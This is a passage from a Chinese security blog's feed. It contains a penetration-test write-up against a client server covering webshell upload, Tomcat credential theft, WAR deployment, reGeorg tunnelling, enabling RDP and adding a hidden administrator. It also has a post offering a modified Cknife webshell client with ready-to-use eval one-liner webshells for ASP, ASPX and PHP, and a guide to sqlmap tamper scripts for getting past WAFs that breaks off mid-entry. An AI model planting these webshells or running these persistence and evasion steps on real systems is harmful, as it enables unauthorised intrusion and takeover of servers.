id="直接在D盘搜索网站根目录下的service1-asmx-文件出来一堆路径只能挨个试"><a href="#直接在D盘搜索网站根目录下的service1-asmx-文件出来一堆路径只能挨个试" class="headerlink" title="直接在D盘搜索网站根目录下的service1.asmx 文件出来一堆路径只能挨个试"></a>直接在D盘搜索网站根目录下的service1.asmx 文件出来一堆路径只能挨个试</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596978236258.webp" alt="image"></p><h4 id="然后就是一顿echo-echo-echo…-直到尝试完最后一个-都是404"><a href="#然后就是一顿echo-echo-echo…-直到尝试完最后一个-都是404" class="headerlink" title="然后就是一顿echo echo echo…   直到尝试完最后一个 都是404"></a>然后就是一顿echo echo echo…   直到尝试完最后一个 都是404</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596978600951.webp" alt="image"></p><h4 id="然后怀疑是不是站库分离-netstat-看了眼-发现不存在分离-顺带还发现服务器对外开了一个-8040端口"><a href="#然后怀疑是不是站库分离-netstat-看了眼-发现不存在分离-顺带还发现服务器对外开了一个-8040端口" class="headerlink" title="然后怀疑是不是站库分离 netstat 看了眼 发现不存在分离 顺带还发现服务器对外开了一个 8040端口"></a>然后怀疑是不是站库分离 netstat 看了眼 发现不存在分离 顺带还发现服务器对外开了一个 8040端口</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596978754711.webp" alt="image"></p><h4 id="对应信息收集时收集的资产-发现还有一套网站在这个服务器"><a href="#对应信息收集时收集的资产-发现还有一套网站在这个服务器" class="headerlink" title="对应信息收集时收集的资产 发现还有一套网站在这个服务器"></a>对应信息收集时收集的资产 发现还有一套网站在这个服务器</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596978767499.webp" alt="image"></p><h4 id="又来了兴致-直接搜索这个网站的路径-进行写入测试"><a href="#又来了兴致-直接搜索这个网站的路径-进行写入测试" class="headerlink" title="又来了兴致 直接搜索这个网站的路径  进行写入测试"></a>又来了兴致 直接搜索这个网站的路径  进行写入测试</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596978844830.webp" alt="image"></p><h4 id="结果一线的404"><a href="#结果一线的404" class="headerlink" title="结果一线的404  - -"></a>结果一线的404  - -</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596978897821.webp" alt="image"></p><h4 id="这时才想起是不是搞错盘了-直接列出机器所有盘符"><a href="#这时才想起是不是搞错盘了-直接列出机器所有盘符" class="headerlink" title="这时才想起是不是搞错盘了 直接列出机器所有盘符"></a>这时才想起是不是搞错盘了 直接列出机器所有盘符</h4><pre><code>    wmic logicaldisk where drivetype=3 get deviceid</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596979005779.webp" alt="image"></p><h1 id="黑人问号"><a href="#黑人问号" class="headerlink" title="黑人问号?"></a>黑人问号?</h1><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596980833753.webp" alt="image"></p><h4 id="这管理员真会分-然后就是找到路径写入一句话-顺利的拿下一个-aspx-的低权限shell"><a href="#这管理员真会分-然后就是找到路径写入一句话-顺利的拿下一个-aspx-的低权限shell" class="headerlink" title="这管理员真会分 然后就是找到路径写入一句话 顺利的拿下一个.aspx 的低权限shell"></a>这管理员真会分 然后就是找到路径写入一句话 顺利的拿下一个.aspx 的低权限shell</h4><h4 id="————被自己前面的-操作蠢哭"><a href="#————被自己前面的-操作蠢哭" class="headerlink" title="————被自己前面的**操作蠢哭"></a>————被自己前面的**操作蠢哭</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596979143916.webp" alt="image"></p><h1 id="3-简单提权与进入内网"><a href="#3-简单提权与进入内网" class="headerlink" title="3.简单提权与进入内网"></a>3.简单提权与进入内网</h1><h2 id="3-1-简单提权"><a href="#3-1-简单提权" class="headerlink" title="3.1 简单提权"></a>3.1 简单提权</h2><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596981018253.webp" alt="image"></p><h4 id="在拿到shell后-翻看目录时发现有个-tomcat-立马想到了一遍-tomcat搭建的权限会比较高"><a href="#在拿到shell后-翻看目录时发现有个-tomcat-立马想到了一遍-tomcat搭建的权限会比较高" class="headerlink" title="在拿到shell后 翻看目录时发现有个 tomcat 立马想到了一遍 tomcat搭建的权限会比较高"></a>在拿到shell后 翻看目录时发现有个 tomcat 立马想到了一遍 tomcat搭建的权限会比较高</h4><h4 id="netstat-看到一个8086端口-不知道为什么前面没看到-可能瞎了-访问确定存在-tomcat"><a href="#netstat-看到一个8086端口-不知道为什么前面没看到-可能瞎了-访问确定存在-tomcat" class="headerlink" title="netstat 看到一个8086端口 不知道为什么前面没看到 可能瞎了 访问确定存在 tomcat"></a>netstat 看到一个8086端口 不知道为什么前面没看到 可能瞎了 访问确定存在 tomcat</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596979365044.webp" alt="image"></p><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596979395408.webp" alt="image"></p><h4 id="找到conf-目录下的-tomcat-users-xml-文件查看明文密码"><a href="#找到conf-目录下的-tomcat-users-xml-文件查看明文密码" class="headerlink" title="找到conf 目录下的 tomcat-users.xml 文件查看明文密码"></a>找到conf 目录下的 tomcat-users.xml 文件查看明文密码</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596979621553.webp" alt="image"><br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596992711277.webp" alt="image"></p><h4 id="然后就是进入后台-部署war包了-成功获取到一个jsp的shell-成功获取到-管理员权限shell"><a href="#然后就是进入后台-部署war包了-成功获取到一个jsp的shell-成功获取到-管理员权限shell" class="headerlink" title="然后就是进入后台 部署war包了 成功获取到一个jsp的shell 成功获取到 管理员权限shell"></a>然后就是进入后台 部署war包了 成功获取到一个jsp的shell 成功获取到 管理员权限shell</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596979530881.webp" alt="image"></p><h2 id="3-2-进入内网"><a href="#3-2-进入内网" class="headerlink" title="3.2 进入内网"></a>3.2 进入内网</h2><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596981170981.webp" alt="image"></p><h2 id="这里我用到-reGeorg-与-SocksCap64-的搭配"><a href="#这里我用到-reGeorg-与-SocksCap64-的搭配" class="headerlink" title="这里我用到 reGeorg 与 SocksCap64 的搭配"></a>这里我用到 reGeorg 与 SocksCap64 的搭配</h2><h4 id="上传reGeorg-中的-jsp脚本到网站目录"><a href="#上传reGeorg-中的-jsp脚本到网站目录" class="headerlink" title="上传reGeorg 中的 jsp脚本到网站目录"></a>上传reGeorg 中的 jsp脚本到网站目录</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596979999413.webp" alt="image"></p><h4 id="访问脚本-出现-Georg-says-‘All-seems-fine’-说明可用"><a href="#访问脚本-出现-Georg-says-‘All-seems-fine’-说明可用" class="headerlink" title="访问脚本 出现 Georg says, ‘All seems fine’ 说明可用"></a>访问脚本 出现 Georg says, ‘All seems fine’ 说明可用</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596980036691.webp" alt="image"></p><h4 id="使用reGeorg连接-脚本"><a href="#使用reGeorg连接-脚本" class="headerlink" title="使用reGeorg连接 脚本"></a>使用reGeorg连接 脚本</h4><pre><code>    python xx.py -u 脚本地址    </code></pre><h4 id="可看到已成功开启代理到本地8888端口"><a href="#可看到已成功开启代理到本地8888端口" class="headerlink" title="可看到已成功开启代理到本地8888端口"></a>可看到已成功开启代理到本地8888端口</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596980134130.webp" alt="image"></p><h4 id="打开第二个工具-SocksCap64-进行地址与代理-端口与类型设置"><a href="#打开第二个工具-SocksCap64-进行地址与代理-端口与类型设置" class="headerlink" title="打开第二个工具 SocksCap64 进行地址与代理 端口与类型设置"></a>打开第二个工具 SocksCap64 进行地址与代理 端口与类型设置</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596980193556.webp" alt="image"></p><h4 id="把需要在目标内网环境运行的程序拖入"><a href="#把需要在目标内网环境运行的程序拖入" class="headerlink" title="把需要在目标内网环境运行的程序拖入"></a>把需要在目标内网环境运行的程序拖入</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596980230729.webp" alt="image"></p><h4 id="发现未开启3389-使用cmd开启"><a href="#发现未开启3389-使用cmd开启" class="headerlink" title="发现未开启3389  使用cmd开启"></a>发现未开启3389  使用cmd开启</h4><pre><code>    开启RDP ： REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f    查询端口 ： REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber</code></pre><h4 id="添加-用户"><a href="#添加-用户" class="headerlink" title="添加 用户"></a>添加 用户</h4><pre><code>    添加用户               ：net user xxx xxx /add    添加进administrators  ：net localgroup administrators xxx /add</code></pre><h4 id="软件内打开远程桌面-连接目标机器内网地址-登录添加的用户"><a href="#软件内打开远程桌面-连接目标机器内网地址-登录添加的用户" class="headerlink" title="软件内打开远程桌面 连接目标机器内网地址 登录添加的用户"></a>软件内打开远程桌面 连接目标机器内网地址 登录添加的用户</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596980290407.webp" alt="image"></p><h4 id="然后就是抓取管理员明文密码-收集浏览器缓存密码-收集网站数据库明文密码-扫描内网web应用进行测试-扫描ms17010等windos漏洞-等等了-由于客户叫停不再继续"><a href="#然后就是抓取管理员明文密码-收集浏览器缓存密码-收集网站数据库明文密码-扫描内网web应用进行测试-扫描ms17010等windos漏洞-等等了-由于客户叫停不再继续" class="headerlink" title="然后就是抓取管理员明文密码 收集浏览器缓存密码 收集网站数据库明文密码 扫描内网web应用进行测试 扫描ms17010等windos漏洞 等等了   由于客户叫停不再继续"></a>然后就是抓取管理员明文密码 收集浏览器缓存密码 收集网站数据库明文密码 扫描内网web应用进行测试 扫描ms17010等windos漏洞 等等了   由于客户叫停不再继续</h4><h1 id="大佬不要喷我"><a href="#大佬不要喷我" class="headerlink" title="大佬不要喷我 "></a>大佬不要喷我 <img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596980628247.webp" alt="image"></h1>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 渗透记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透笔记 </tag>
            
            <tag> 记一次渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次对某汽车公司的简单渗透过程</title>
      <link href="2020/08/08/%E6%9F%90%E6%B1%BD%E8%BD%A6%E5%85%AC%E5%8F%B8/"/>
      <url>2020/08/08/%E6%9F%90%E6%B1%BD%E8%BD%A6%E5%85%AC%E5%8F%B8/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抽根利群冷静下再想想！" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="4898eaf7e690a18c90387a4751f092926887f495c0dd09b25639878a5001f82a">09f7e28a2ee5cc0acb1a500e2b9fb1297435f08653cb47d2da75f53c9bdce32a16820912d1844e581a03f7cbba597a45bf7bdc57409694c6d8c79ef9a4efe06d7ee82643d7b01df0e7a71a79f6ab8add1df932970bb02bb798a97619626611f011a1c34b36c23234ab5b3e45d4e9ab57de159197a7a92bf982667afb86f4c7bee3dd681cdb254e975500a94c9b70865ac4996bfd67752fac9d36c928d050773fde5202e9f34bd270c79cca1d74906a7dd0562d11b076e10d263b941a9b7443447f3dc7a1a0978802cb3d3fe1ccacdf34aba2607ed2917b13e814865a27db48f4d52b2c6a46214935096426a8ef23d8586dee2722e7ed32a25d4968b3663cfe290907854ab0e23ac3d86fd749c5dfa6027ec1b9a3fbde264a96cf3a6c340d5476bb4fa3a52372c514719d8ae3a931f9cc646dd4c2baa7bae2af6f811ff6d7c0e9c957ea156a1b84e33b101cafa6bd45679aa28d5400e45f64533c035d1e3d4ce9a52e9484c78dbee17213db0222ec53b0b358ba552bdac2d6cb3f282d6b7c426d9d266c574bedd5da2c01b5840d175e1ffbd4fc41866ee8c29497e4ff891d26f16e863f8d982bc025d88b498f93a5dce80d65af3fafb5b5f9534c3ff716e1938c607207d37f90ec4dc5bff1e94e1a9f6cf951af5d05f5f2060f33a4288b134389db40abbc2060f82abe6db117d5c128e5575f1b128b943e3fb9f2f23f8be9a7f578a17d23d30b75ba99b4fcd648d398df46aa717f026aba72bd9a0bb1ac6914e321d3393be31db51be9790050684ad6f18913bdfdc65da167dd60b4d7b6a7de7f37cdb8cef9d5ac358fc43cb914a756d911b2b86661e1acce1c82d99630da83dd20b5eb2e7176f18d8d5e596742f7091bed97b7757b5ba3a3ac5e990fa993bfc4f3fecaeeb52f250664fa4f6dcd0252f212a73a801e6bc0704304b635855195b317fb240a918bcc48aeba51493de36de8819ab5e9aa8f0473cc86ef578c4e3a311200745b3983b8be0ac05b12f8afbd88ac226ff00883493b9015631390bcbc1014e4a45e931e624377d394baadf103bc68c30a2727474b97b87d1965ef47f05107958285cbcccb88457ec4530a2de90f550632ebfa1921bfc3e9e34a552485d8df74e5f145387e40e1afc0bb7b883784c41fdd7141e7bef32a5b7be8a220a3c1e7118a79171b9f693d46a29af4191ae6698ba76da7a9380a8f0f5b996ba4be533fe981c67900282732d487a122f05442efac450f605a80b29d44cabf2431d9b9db81590abf37429ef073c2e408fb70aa099f6c6a37000c682535b450050a27abb4881f8d526e88e56704246567b7fde88180455d923b44920d2c538aaa1f0a9e675bda048f968086e9a76e1847ec839f5b47a78a119ccb5df564e8cd8b1bad8677f862225eeddc972729b02488399078</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂不公开                                                                                                                                                                                   .</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap使用 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> c段 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cknife 跨平台菜刀 修改版</title>
      <link href="2020/06/18/untitled-1592474049377/"/>
      <url>2020/06/18/untitled-1592474049377/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="修复了一些兼容问题"><a href="#修复了一些兼容问题" class="headerlink" title="修复了一些兼容问题"></a>修复了一些兼容问题</h1><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1592474501589.webp" alt="image"></p><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1592474702573.webp" alt="image"></p><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1592474878695.webp" alt="image"></p><h2 id="完美支持ASP、ASPX、PHP、JSP、JSPX、Customize-自定义"><a href="#完美支持ASP、ASPX、PHP、JSP、JSPX、Customize-自定义" class="headerlink" title="完美支持ASP、ASPX、PHP、JSP、JSPX、Customize(自定义)"></a>完美支持ASP、ASPX、PHP、JSP、JSPX、Customize(自定义)</h2><h3 id="ASP"><a href="#ASP" class="headerlink" title="ASP:"></a>ASP:</h3><pre><code>&lt;%eval request(&quot;Liqun&quot;)%&gt;</code></pre><h3 id="ASP-NET"><a href="#ASP-NET" class="headerlink" title="ASP.NET:"></a>ASP.NET:</h3><pre><code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;Liqun&quot;],&quot;unsafe&quot;);%&gt;</code></pre><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP:"></a>PHP:</h3><pre><code>&lt;?php @eval($_POST[&#39;Liqun&#39;]);?&gt;</code></pre><h3 id="JSP"><a href="#JSP" class="headerlink" title="JSP:"></a>JSP:</h3><pre><code>[代码详见1.jsp]</code></pre><h3 id="JSPX"><a href="#JSPX" class="headerlink" title="JSPX:"></a>JSPX:</h3><pre><code>[代码详见1.jspx]</code></pre><h3 id="Customize"><a href="#Customize" class="headerlink" title="Customize:"></a>Customize:</h3><p>下载地址  ： <a href="https://www.ailiqun.xyz/images/Liqun.rar">Liqun.rar</a></p><pre><code>自定义类型,功能代码在服务端保存,理论上支持所有动态脚本,只要正确进行交互即可    原作者开源项目地址 ： https://github.com/Chora10/Cknife</code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 菜刀 </tag>
            
            <tag> webshell </tag>
            
            <tag> 网站管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap tamper 相关脚本的详细解读</title>
      <link href="2020/06/15/tamper/"/>
      <url>2020/06/15/tamper/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、SQLMap中tamper的简介"><a href="#一、SQLMap中tamper的简介" class="headerlink" title="一、SQLMap中tamper的简介"></a>一、SQLMap中tamper的简介</h1><h2 id="1-tamper的作用"><a href="#1-tamper的作用" class="headerlink" title="1.tamper的作用"></a>1.tamper的作用</h2><p>使用SQLMap提供的tamper脚本，可在一定程度上避开应用程序的敏感字符过滤、绕过WAF规则的阻挡，继而进行渗透攻击。</p><p>部分防护系统的缩写：</p><p>WAF：Web应用程序防火墙，Web Application Firewall<br>IPS：入侵防御系统， Intrusion Prevention System<br>IDS：入侵检测系统，Intrusion Detection System</p><h2 id="2-tamper用法"><a href="#2-tamper用法" class="headerlink" title="2.tamper用法"></a>2.tamper用法</h2><p>–tamper=TAMPER 利用给定的脚本进行篡改注入数据。其用法可举例说明：<br>python sqlmap.py -u “http://…/?uname=admin&amp;pwd=pass123” –level=5 –risk=3 -p “uname” –tamper=xxx.py<br>表示对指定的url地址，以所设置的level等级、risk等级，并采用选定的tamper篡改脚本对参数“uname”进行检测</p><h1 id="二、适配不同数据库类型的测试tamper"><a href="#二、适配不同数据库类型的测试tamper" class="headerlink" title="二、适配不同数据库类型的测试tamper"></a>二、适配不同数据库类型的测试tamper</h1><p>当使用SQLMap篡改脚本执行渗透测试时，面对众多tamper可能会比较困惑，一开始不晓得该使用哪些脚本来测试。有的脚本是适用于常用数据库的SQL注入攻击，有的适用于特定类型的数据库，还有的适用于某种数据库的特定版本范围。为了相对明确的了解tamper的使用场景，把tamper的使用类型和范围作一下划分，具体如下：</p><h2 id="SQLMap目录中的所有tamper-script"><a href="#SQLMap目录中的所有tamper-script" class="headerlink" title="SQLMap目录中的所有tamper script"></a>SQLMap目录中的所有tamper script</h2><pre><code>tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords</code></pre><h2 id="通用的测试tamper"><a href="#通用的测试tamper" class="headerlink" title="通用的测试tamper"></a>通用的测试tamper</h2><pre><code>tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes</code></pre><h2 id="MSSQL-Microsoft-SQL-Servre"><a href="#MSSQL-Microsoft-SQL-Servre" class="headerlink" title="MSSQL(Microsoft SQL Servre)"></a>MSSQL(Microsoft SQL Servre)</h2><pre><code>tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes</code></pre><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><pre><code>tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor</code></pre><h2 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h2><pre><code>tamper=between,charencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes,xforwardedfor</code></pre><h2 id="Microsoft-Access"><a href="#Microsoft-Access" class="headerlink" title="Microsoft Access"></a>Microsoft Access</h2><pre><code>tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords</code></pre><h2 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h2><pre><code>  tamper=  between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesp  here,space2comment,space2plus,spae2randomblank,xforwardedfor</code></pre><h2 id="tamper适用的数据库类型-amp-版本"><a href="#tamper适用的数据库类型-amp-版本" class="headerlink" title="tamper适用的数据库类型&amp;版本"></a>tamper适用的数据库类型&amp;版本</h2><table><thead><tr><th align="left">TAMPER</th><th align="left">MySQL</th><th align="left">MSSQL</th><th align="left">Oracle</th><th align="left">PostgreSQL</th></tr></thead><tbody><tr><td align="left">apostrophemask</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">apostrophenullencode</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">appendnullbyte</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">base64encode</td><td align="left">4,5,5.5</td><td align="left">2005</td><td align="left">10g</td><td align="left">-</td></tr><tr><td align="left">between</td><td align="left">5.1</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">bluecoat</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">apostrophemask</td><td align="left">9.0.3</td><td align="left">20002005</td><td align="left">-</td><td align="left">9.3</td></tr><tr><td align="left">charunicodeencode</td><td align="left">4,5.0 and 5.5</td><td align="left">2005</td><td align="left">10g</td><td align="left">8.3,8.4,9.0</td></tr><tr><td align="left">charencode</td><td align="left">*</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">commalessmid</td><td align="left">*</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">concat2concatws</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">equaltolike</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">greatest</td><td align="left">&lt; 5.1</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">halfversionedmorekeywords</td><td align="left">5.0 and 5.5</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">ifnull2ifisnull</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">informationschemacomment</td><td align="left">4,5.0,5.5</td><td align="left">2005</td><td align="left">10g</td><td align="left">8.3,8.4,9.0</td></tr><tr><td align="left">lowercase</td><td align="left">5</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">modsecurityversioned</td><td align="left">5</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">modsecurityzeroversioned</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">multiplespaces</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">nonrecursivereplacement</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">overlongutf8</td><td align="left">5.1.56,5.5.11</td><td align="left">2000, 2005</td><td align="left">N/A</td><td align="left">9</td></tr><tr><td align="left">percentage</td><td align="left">4, 5.0,5.5</td><td align="left">2005</td><td align="left">10g</td><td align="left">8.3,8.4,9.0</td></tr><tr><td align="left">randomcase</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">randomcomments</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">securesphere</td><td align="left">4,5.0,5.5</td><td align="left">2005</td><td align="left">10g</td><td align="left">8.3,8.4,9.0</td></tr><tr><td align="left">space2comment</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">space2dash</td><td align="left">4.0,5.0</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">space2hash</td><td align="left">&gt;= 5.1.13</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">space2morehash</td><td align="left">-</td><td align="left">2000, 2005</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">space2mssqlblank</td><td align="left">*</td><td align="left">*</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">space2mssqlhash</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">space2plus</td><td align="left">4,5.0,5.5</td><td align="left">2005</td><td align="left">10g</td><td align="left">8.3,8.4,9.0</td></tr><tr><td align="left">space2randomblank</td><td align="left">-</td><td align="left">*</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">sp_password</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">symboliclogical</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">unionalltounion</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">unmagicquotes</td><td align="left">4, 5.0,5.5</td><td align="left">2005</td><td align="left">10g</td><td align="left">8.3,8.4,9.0</td></tr><tr><td align="left">uppercase</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">varnish</td><td align="left">*</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">versionedkeywords</td><td align="left">&gt;=5.1.13</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">versionedmorekeywords</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr><tr><td align="left">xforwardedfor</td><td align="left">*</td><td align="left">*</td><td align="left">*</td><td align="left">*</td></tr></tbody></table><h1 id="三、SQLMap中tamper篡改脚本的功能解释"><a href="#三、SQLMap中tamper篡改脚本的功能解释" class="headerlink" title="三、SQLMap中tamper篡改脚本的功能解释"></a>三、SQLMap中tamper篡改脚本的功能解释</h1><h2 id="apostrophemask-py"><a href="#apostrophemask-py" class="headerlink" title="apostrophemask.py"></a>apostrophemask.py</h2><p>功能：对引号进行utf-8格式编码(%EF%BC%87)<br>平台：All<br>举例：1 AND ‘1’=’1 ==&gt; 1 AND %EF%BC%871%EF%BC%87=%EF%BC%871</p><h2 id="apostrophenullencode-py"><a href="#apostrophenullencode-py" class="headerlink" title="apostrophenullencode.py"></a>apostrophenullencode.py</h2><p>功能：用非法的双unicode字符(%00%27)替换引号字符<br>平台：All<br>举例：1 AND ‘1’=’1 ==&gt; 1 AND %00%271%00%27=%00%271</p><h2 id="appendnullbyte-py"><a href="#appendnullbyte-py" class="headerlink" 